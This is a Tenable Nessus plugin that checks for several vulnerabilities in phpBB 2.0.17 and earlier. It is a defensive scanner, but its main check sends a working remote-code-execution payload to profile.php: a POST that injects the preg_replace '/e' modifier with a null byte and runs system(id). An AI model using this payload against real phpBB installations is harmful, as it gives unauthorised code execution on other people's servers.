#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20132);
  script_version("$Revision: 1.15 $");
  script_cve_id("CVE-2005-3415", "CVE-2005-3416", "CVE-2005-3417", "CVE-2005-3418",
    "CVE-2005-3419", "CVE-2005-3420", "CVE-2005-3536", "CVE-2005-3537");
  script_bugtraq_id(15243, 15246);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"20386");
    script_xref(name:"OSVDB", value:"20387");
    script_xref(name:"OSVDB", value:"20388");
    script_xref(name:"OSVDB", value:"20389");
    script_xref(name:"OSVDB", value:"20390");
    script_xref(name:"OSVDB", value:"20391");
    script_xref(name:"OSVDB", value:"20397");
    script_xref(name:"OSVDB", value:"20413");
    script_xref(name:"OSVDB", value:"20414");
    script_xref(name:"OSVDB", value:"22270");
  }

  script_name(english:"phpBB <= 2.0.17 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in phpBB <= 2.0.17");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of phpBB that, if using PHP 5
with 'register_globals' enabled, fails to properly deregister global
variables as well as to initialize several variables in various
scripts.  An attacker may be able to exploit these issues to execute
arbitrary code or to conduct SQL injection and cross-site scripting
attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_172005.75.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.phpbb.com/phpBB/viewtopic.php?f=14&t=336756" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpBB version 2.0.18 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("phpbb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Check whether the profile.php script exists.
  r = http_send_recv3(method: "GET", item:string(dir, "/profile.php?mode=register"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ('href="profile.php?mode=register&amp;sid=' >< res) {
    # Try to exploit some of the flaws to run a command.
    exploit = "system(id)";
    postdata = string(
      "mode=register&",
      "agreed=true&",
      # nb: sets $error in "includes/usercp_register.php".
      "language=1&",
      # nb: causes array_merge() to fail in "common.php" w/ PHP5 so we avoid
      #     deregistering 'signature' and 'signature_bbcode_uid'.
      "HTTP_SESSION_VARS=1&",
      # nb: specifies our exploit.
      "signature=:", exploit, "&",
      # nb: injects the "e" modifier into preg_replace; 
      #     the null-byte requires magic_quotes to be off.
      "signature_bbcode_uid=(.*)/e%00"
    );
    r = http_send_recv3(method: "POST ", version: 11, port: port,
      item: string(dir, "/profile.php?mode=register"), 
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
      data: postdata );
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if we were able to run our command.
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      if (report_verbosity > 0) {
        output = strstr(res, '<textarea name="signature"');
        if (output) {
          output = output - strstr(output, "</textarea>");
          output = strstr(output, ">");
          output = output - ">";
        }
        else
	 output = res;
        security_hole(port:port, extra: output);
      }
      else
        security_hole(port:port);

      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }

  # If we're being paranoid.
  if (report_paranoia > 1) {
    # Report if the version number <= 2.0.17 as the exploit might have failed.
    if (ver =~ "([01]\.|2\.0\.([0-9]($|[^0-9])|1[0-7]))") {
      security_hole(port:port, extra: "
***** Nessus has determined the vulnerability exists on the remote
***** host simply by looking at the version number of phpBB
***** installed there.
");

      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
